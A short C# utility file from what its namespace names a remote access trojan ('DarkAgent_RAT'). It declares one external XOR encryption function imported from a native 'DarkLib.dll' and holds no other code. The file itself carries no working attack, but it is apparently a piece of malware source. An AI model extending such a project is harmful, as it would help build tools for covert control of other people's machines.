using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace DarkAgent_RAT.src.Utils
{
    public class LibCalls
    {
        [DllImport("DarkLib.dll")]
        public static extern int[] XorEncryption(int[] data);
    }
}